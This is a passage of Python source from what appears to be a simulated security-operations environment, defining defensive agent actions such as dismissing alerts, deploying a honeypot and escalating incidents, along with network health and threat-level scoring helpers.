                description=f"Alert {alert_id} not found.",
                resource_cost=0.0,
            )

        if alert.resolved or alert.dismissed:
            return ActionResult(
                action_type="dismiss_alert", success=False,
                description=f"Alert {alert_id} has already been handled.",
                resource_cost=0.0,
            )

        alert.dismissed = True
        correctly_dismissed = alert.is_false_positive
        ignored_real = not alert.is_false_positive

        return ActionResult(
            action_type="dismiss_alert", success=True,
            description=(
                f"Alert {alert_id} dismissed as false positive."
                + (" Correct — this was indeed a false positive." if correctly_dismissed else "")
            ),
            false_positive_correctly_dismissed=correctly_dismissed,
            real_threat_ignored=ignored_real,
            resource_cost=0.0,
        )

    def deploy_honeypot(self) -> ActionResult:
        """Deploy a honeypot to gather attacker intelligence."""
        if self.honeypot_deployed:
            return ActionResult(
                action_type="deploy_honeypot", success=False,
                description="Honeypot is already deployed.",
                resource_cost=0.5,
            )

        self.honeypot_deployed = True
        node = self.nodes.get("honey-01")
        if node:
            node.open_ports = [22, 80, 445, 3389]
            node.running_services = ["fake-ssh", "fake-http", "fake-smb", "fake-rdp"]

        self._budget -= 4.0

        return ActionResult(
            action_type="deploy_honeypot", success=True,
            description="Honeypot deployed at 10.0.5.1. It will attract and log attacker activity.",
            intel_gathered=1.0,
            resource_cost=4.0,
        )

    def escalate_incident(self, description: str) -> ActionResult:
        """Escalate to senior analyst. Safe fallback but incurs penalty."""
        self._budget -= 2.0
        return ActionResult(
            action_type="escalate_incident", success=True,
            description=f"Incident escalated: '{description}'. A senior analyst is reviewing. This buys time but uses resources.",
            resource_cost=2.0,
            health_delta=0.01,
        )

    # --- Observation helpers ---


    def add_alert(self, alert: NetworkAlert) -> None:
        """Add a new alert to the SIEM."""
        self.alerts[alert.alert_id] = alert

    def generate_alert_id(self) -> str:
        """Generate a unique alert ID."""
        self._alert_counter += 1
        return f"ALT-{self._alert_counter:04d}"

    def get_pending_alerts(self) -> list[dict]:
        """Get all unresolved alerts."""
        return [
            a.to_dict() for a in self.alerts.values()
            if not a.resolved and not a.dismissed
        ]

    def get_resolved_alert_ids(self) -> list[str]:
        """Get IDs of resolved alerts."""
        return [a.alert_id for a in self.alerts.values() if a.resolved]

    def get_visible_topology(self) -> list[dict]:
        """Get the network topology visible to the agent."""
        return [n.to_dict() for n in self.nodes.values()]

    def calculate_threat_level(self) -> str:
        """Calculate the current overall threat level."""
        compromised = sum(
            1 for n in self.nodes.values()
            if n.status in (NodeStatus.COMPROMISED, NodeStatus.ENCRYPTED)
        )
        critical_compromised = sum(
            1 for n in self.nodes.values()
            if n.is_critical and n.status in (NodeStatus.COMPROMISED, NodeStatus.ENCRYPTED)
        )
        pending = sum(
            1 for a in self.alerts.values()
            if not a.resolved and not a.dismissed and a.severity in (AlertSeverity.CRITICAL, AlertSeverity.HIGH)
        )

        if critical_compromised >= 2 or compromised >= 4:
            return ThreatLevel.CRITICAL.value
        elif critical_compromised >= 1 or compromised >= 3:
            return ThreatLevel.RED.value
        elif compromised >= 2 or pending >= 3:
            return ThreatLevel.ORANGE.value
        elif compromised >= 1 or pending >= 1:
            return ThreatLevel.YELLOW.value
        return ThreatLevel.GREEN.value

    def health_score(self) -> float:
        """Calculate network health score (0.0 = catastrophic, 1.0 = perfect)."""
        total = len(self.nodes)
        if total == 0:
            return 0.99
        healthy = sum(1 for n in self.nodes.values() if n.status == NodeStatus.HEALTHY)
        isolated = sum(1 for n in self.nodes.values() if n.status == NodeStatus.ISOLATED)
        # Isolated healthy nodes penalize slightly, isolated compromised is neutral
        score = (healthy + 0.5 * isolated) / total
        return round(max(0.01, min(0.99, score)), 3)

    def compromised_count(self) -> int:
        """Count of currently compromised nodes."""
        return sum(
            1 for n in self.nodes.values()
            if n.status in (NodeStatus.COMPROMISED, NodeStatus.ENCRYPTED)
        )

    def is_catastrophic_breach(self) -> bool:
        """Check if the network is in catastrophic failure."""
        critical_down = sum(
            1 for n in self.nodes.values()
            if n.is_critical and n.status in (
                NodeStatus.COMPROMISED, NodeStatus.ENCRYPTED, NodeStatus.OFFLINE
            )
        )
        return critical_down >= 3

    def budget_remaining(self) -> float:
        """Return remaining action budget."""
        return round(max(0.0, self._budget), 1)

    def elapsed_steps(self) -> int:
        """Return steps elapsed."""
        return self._step_count

    def increment_step(self) -> None:
        """Advance the step counter."""
        self._step_count += 1

    def mark_alerts_resolved_for_node(self, node_id: str) -> int:
        """Mark all alerts related to a node as resolved."""
        count = 0
        for alert in self.alerts.values():
            if alert.related_node_id == node_id and not alert.resolved:
                alert.resolved = True
                count += 1
        return count

    def mark_alerts_resolved_for_ip(self, ip_address: str) -> int:
        """Mark all alerts from a source IP as resolved."""
        count = 0
        for alert in self.alerts.values():
            if alert.source_ip == ip_address and not alert.resolved:
                alert.resolved = True
                count += 1
        return count
